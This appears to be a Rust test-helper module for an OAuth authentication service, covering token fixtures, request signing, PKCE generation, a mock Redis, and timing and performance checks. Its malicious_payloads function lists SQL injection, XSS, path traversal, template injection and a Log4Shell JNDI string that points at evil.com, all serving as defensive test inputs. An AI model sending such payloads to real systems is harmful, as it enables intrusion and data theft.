// Test utilities and helpers for comprehensive testing

use auth_service::{app, store::TokenStore, AppState};
use axum::extract::Request;
use axum::response::Response;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use reqwest::Client;
use serde_json::Value;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::sync::RwLock;

/// Test fixture for generating various tokens and clients
pub struct TestFixture {
    pub client: Client,
    pub base_url: String,
    pub valid_client_id: String,
    pub valid_client_secret: String,
    pub invalid_client_id: String,
    pub invalid_client_secret: String,
}

impl TestFixture {
    /// Create a new test fixture with a spawned test server
    pub async fn new() -> Self {
        std::env::set_var("TEST_MODE", "1");
        std::env::set_var("REQUEST_SIGNING_SECRET", "test_secret");
        std::env::set_var("DISABLE_RATE_LIMIT", "1");

        let listener = TcpListener::bind(("127.0.0.1", 0)).await.unwrap();
        let addr = listener.local_addr().unwrap();

        let mut client_credentials = HashMap::new();
        client_credentials.insert("test_client".to_string(), "test_secret".to_string());
        client_credentials.insert("admin_client".to_string(), "admin_secret".to_string());
        client_credentials.insert("read_client".to_string(), "read_secret".to_string());
        client_credentials.insert("write_client".to_string(), "write_secret".to_string());

        let policy_cache_config = auth_service::policy_cache::PolicyCacheConfig::default();
        let policy_cache = Arc::new(auth_service::policy_cache::PolicyCache::new(
            policy_cache_config,
        ));

        let app_state = AppState {
            token_store: TokenStore::InMemory(Arc::new(RwLock::new(HashMap::new()))),
            client_credentials,
            allowed_scopes: vec![
                "read".to_string(),
                "write".to_string(),
                "admin".to_string(),
                "openid".to_string(),
                "profile".to_string(),
                "email".to_string(),
            ],
            authorization_codes: Arc::new(RwLock::new(HashMap::new())),
            policy_cache,
            backpressure_state: std::sync::Arc::new(
                auth_service::backpressure::BackpressureState::new(
                    auth_service::backpressure::BackpressureConfig::default(),
                ),
            ),
        };

        let app = app(app_state);
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        // Wait a bit for server to start
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;

        Self {
            client: Client::new(),
            base_url: format!("http://{}", addr),
            valid_client_id: "test_client".to_string(),
            valid_client_secret: "test_secret".to_string(),
            invalid_client_id: "invalid_client".to_string(),
            invalid_client_secret: "invalid_secret".to_string(),
        }
    }

    /// Create HTTP Basic Auth header
    pub fn basic_auth_header(&self, client_id: &str, client_secret: &str) -> String {
        let credentials = format!("{}:{}", client_id, client_secret);
        let encoded = STANDARD.encode(credentials.as_bytes());
        format!("Basic {}", encoded)
    }

    /// Get a valid access token for testing
    pub async fn get_access_token(&self) -> String {
        self.get_access_token_with_scope(None).await
    }

    /// Get access token with specific scope
    pub async fn get_access_token_with_scope(&self, scope: Option<&str>) -> String {
        let mut body = "grant_type=client_credentials".to_string();
        if let Some(s) = scope {
            body.push_str(&format!("&scope={}", s));
        }

        let response = self
            .client
            .post(&format!("{}/oauth/token", self.base_url))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .header(
                "Authorization",
                self.basic_auth_header(&self.valid_client_id, &self.valid_client_secret),
            )
            .body(body)
            .send()
            .await
            .unwrap();

        let token_response: Value = response.json().await.unwrap();
        token_response["access_token"].as_str().unwrap().to_string()
    }

    /// Get admin access token
    pub async fn get_admin_token(&self) -> String {
        self.get_access_token_with_scope(Some("admin")).await
    }

    /// Create a request with proper signature for critical operations
    pub fn sign_request(&self, method: &str, path: &str, body: &str) -> (String, String) {
        let secret = "test_secret";
        let timestamp = chrono::Utc::now().timestamp();
        let message = format!("{}\n{}\n{}\n{}", method, path, body, timestamp);

        use hmac::{Hmac, Mac};
        use sha2::Sha256;
        type HmacSha256 = Hmac<Sha256>;

        let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).unwrap();
        mac.update(message.as_bytes());
        let signature = STANDARD.encode(mac.finalize().into_bytes());

        (signature, timestamp.to_string())
    }

    /// Wait for async operations to complete
    pub async fn wait_for_async(&self) {
        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
    }

    /// Generate test PKCE challenge
    pub fn generate_pkce_challenge() -> (String, String) {
        use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine as _};
        use sha2::{Digest, Sha256};

        // Generate code verifier
        let verifier: String = (0..43)
            .map(|_| {
                let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
                charset[rand::random::<usize>() % charset.len()] as char
            })
            .collect();

        // Generate code challenge
        let mut hasher = Sha256::new();
        hasher.update(verifier.as_bytes());
        let challenge = URL_SAFE_NO_PAD.encode(hasher.finalize());

        (verifier, challenge)
    }
}

/// Mock Redis for testing
pub struct MockRedis {
    store: Arc<RwLock<HashMap<String, String>>>,
}

impl MockRedis {
    pub fn new() -> Self {
        Self {
            store: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    pub async fn set(&self, key: &str, value: &str) {
        let mut store = self.store.write().await;
        store.insert(key.to_string(), value.to_string());
    }

    pub async fn get(&self, key: &str) -> Option<String> {
        let store = self.store.read().await;
        store.get(key).cloned()
    }

    pub async fn del(&self, key: &str) -> bool {
        let mut store = self.store.write().await;
        store.remove(key).is_some()
    }

    pub async fn exists(&self, key: &str) -> bool {
        let store = self.store.read().await;
        store.contains_key(key)
    }
}

/// Test data generators
pub struct TestDataGenerator;

impl TestDataGenerator {
    /// Generate valid test JWT token
    pub fn generate_test_jwt() -> String {
        use jsonwebtoken::{encode, EncodingKey, Header};
        use serde::Serialize;

        #[derive(Serialize)]
        struct Claims {
            sub: String,
            exp: usize,
            iat: usize,
        }

        let now = chrono::Utc::now().timestamp() as usize;
        let claims = Claims {
            sub: "test_user".to_string(),
            exp: now + 3600,
            iat: now,
        };

        let key = EncodingKey::from_secret(b"test_secret");
        encode(&Header::default(), &claims, &key).unwrap()
    }

    /// Generate malicious payloads for security testing
    pub fn malicious_payloads() -> Vec<&'static str> {
        vec![
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "admin'; UNION SELECT * FROM users; --",
            "\0\0\0\0",
            "../../../../windows/system32/",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
        ]
    }

    /// Generate boundary test values
    pub fn boundary_values() -> Vec<String> {
        vec![
            "".to_string(),        // Empty
            " ".repeat(1000),      // Very long spaces
            "x".repeat(10000),     // Very long string
            "\n\r\t".to_string(),  // Control characters
            "üñíçødé".to_string(), // Unicode
            "💀🔥🚀".to_string(),  // Emojis
        ]
    }

    /// Generate concurrent test users
    pub fn generate_test_users(count: usize) -> Vec<String> {
        (0..count).map(|i| format!("test_user_{}", i)).collect()
    }
}

/// Security test utilities
pub struct SecurityTestUtils;

impl SecurityTestUtils {
    /// Test for timing attack resistance
    pub async fn test_timing_attack_resistance<F, Fut>(
        operation: F,
        valid_input: &str,
        invalid_input: &str,
        iterations: usize,
    ) -> bool
    where
        F: Fn(String) -> Fut + Clone,
        Fut: std::future::Future<Output = bool>,
    {
        let mut valid_times = Vec::new();
        let mut invalid_times = Vec::new();

        for _ in 0..iterations {
            // Test with valid input
            let start = std::time::Instant::now();
            let _ = operation(valid_input.to_string()).await;
            valid_times.push(start.elapsed().as_nanos());

            // Test with invalid input
            let start = std::time::Instant::now();
            let _ = operation(invalid_input.to_string()).await;
            invalid_times.push(start.elapsed().as_nanos());
        }

        // Calculate averages
        let valid_avg: f64 = valid_times.iter().sum::<u128>() as f64 / valid_times.len() as f64;
        let invalid_avg: f64 =
            invalid_times.iter().sum::<u128>() as f64 / invalid_times.len() as f64;

        // Check if timing difference is within acceptable range (less than 10% difference)
        let difference_ratio = (valid_avg - invalid_avg).abs() / valid_avg.max(invalid_avg);
        difference_ratio < 0.1
    }

    /// Generate cryptographically secure random string
    pub fn generate_secure_random(length: usize) -> String {
        use rand::Rng;
        const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                                 abcdefghijklmnopqrstuvwxyz\
                                 0123456789";
        let mut rng = rand::thread_rng();

        (0..length)
            .map(|_| {
                let idx = rng.gen_range(0..CHARSET.len());
                CHARSET[idx] as char
            })
            .collect()
    }
}

/// Performance test utilities
pub struct PerformanceTestUtils;

impl PerformanceTestUtils {
    /// Measure operation latency
    pub async fn measure_latency<F, Fut>(operation: F, iterations: usize) -> (f64, f64, f64)
    where
        F: Fn() -> Fut,
        Fut: std::future::Future<Output = ()>,
    {
        let mut times = Vec::new();

        for _ in 0..iterations {
            let start = std::time::Instant::now();
            operation().await;
            times.push(start.elapsed().as_nanos() as f64);
        }

        times.sort_by(|a, b| a.partial_cmp(b).unwrap());

        let avg = times.iter().sum::<f64>() / times.len() as f64;
        let p50 = times[times.len() / 2];
        let p95 = times[(times.len() as f64 * 0.95) as usize];

        (avg / 1_000_000.0, p50 / 1_000_000.0, p95 / 1_000_000.0) // Convert to milliseconds
    }

    /// Test concurrent operations
    pub async fn test_concurrent_operations<F, Fut>(
        operation: F,
        concurrent_count: usize,
        iterations_per_task: usize,
    ) -> Vec<f64>
    where
        F: Fn() -> Fut + Send + Sync + Clone + 'static,
        Fut: std::future::Future<Output = ()> + Send,
    {
        let mut handles = Vec::new();
        let start_time = std::time::Instant::now();

        for _ in 0..concurrent_count {
            let op = operation.clone();
            let handle = tokio::spawn(async move {
                let mut task_times = Vec::new();
                for _ in 0..iterations_per_task {
                    let start = std::time::Instant::now();
                    op().await;
                    task_times.push(start.elapsed().as_nanos() as f64);
                }
                task_times
            });
            handles.push(handle);
        }

        let mut all_times = Vec::new();
        for handle in handles {
            let task_times = handle.await.unwrap();
            all_times.extend(task_times);
        }

        let total_time = start_time.elapsed().as_millis() as f64;
        let throughput = (concurrent_count * iterations_per_task) as f64 / (total_time / 1000.0);

        println!("Concurrent test completed: {} ops/sec", throughput);

        all_times.into_iter().map(|t| t / 1_000_000.0).collect() // Convert to milliseconds
    }
}

/// Test assertion helpers
pub trait TestAssertions {
    fn assert_security_headers(&self);
    fn assert_no_sensitive_data(&self);
    fn assert_rate_limited(&self);
}

impl TestAssertions for Response {
    fn assert_security_headers(&self) {
        let headers = self.headers();
        assert!(headers.contains_key("x-content-type-options"));
        assert!(headers.contains_key("x-frame-options"));
        assert!(headers.contains_key("x-xss-protection"));
    }

    fn assert_no_sensitive_data(&self) {
        // This would need to be implemented based on the actual response body
        // For now, we'll just check headers don't contain sensitive info
        let headers = self.headers();
        for (name, value) in headers.iter() {
            let value_str = value.to_str().unwrap_or("");
            assert!(!value_str.contains("password"));
            assert!(!value_str.contains("secret"));
            assert!(!value_str.contains("private"));
        }
    }

    fn assert_rate_limited(&self) {
        assert_eq!(self.status(), 429);
        assert!(self.headers().contains_key("retry-after"));
    }
}

/// Property-based testing utilities
pub struct PropertyTestUtils;

impl PropertyTestUtils {
    /// Generate random valid tokens for property testing
    pub fn generate_valid_tokens(count: usize) -> Vec<String> {
        (0..count)
            .map(|_| format!("tk_{}", uuid::Uuid::new_v4()))
            .collect()
    }

    /// Generate random invalid tokens for property testing
    pub fn generate_invalid_tokens(count: usize) -> Vec<String> {
        let mut tokens = Vec::new();

        for _ in 0..count {
            // Generate various types of invalid tokens
            match rand::random::<u8>() % 5 {
                0 => tokens.push("".to_string()),               // Empty
                1 => tokens.push("invalid_format".to_string()), // Wrong format
                2 => tokens.push("rt_".repeat(100)),            // Too long
                3 => tokens.push("tk_\0\0\0".to_string()),      // Contains nulls
                _ => tokens.push(SecurityTestUtils::generate_secure_random(50)), // Random string
            }
        }

        tokens
    }
}
